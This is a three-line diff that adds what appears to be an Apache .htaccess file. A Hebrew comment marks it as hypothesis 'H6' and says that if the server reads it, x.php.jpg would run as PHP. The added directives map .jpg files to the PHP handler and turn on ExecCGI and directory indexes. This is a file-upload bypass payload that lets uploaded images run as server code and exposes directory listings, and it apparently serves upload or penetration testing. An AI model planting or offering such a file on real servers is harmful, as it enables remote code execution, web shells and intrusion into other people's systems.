@@ -1,0 +1,3 @@
+# H6 — אם השרת קורא את זה, x.php.jpg היה רץ כ-PHP
+AddHandler application/x-httpd-php .jpg
+Options +ExecCGI +Indexes
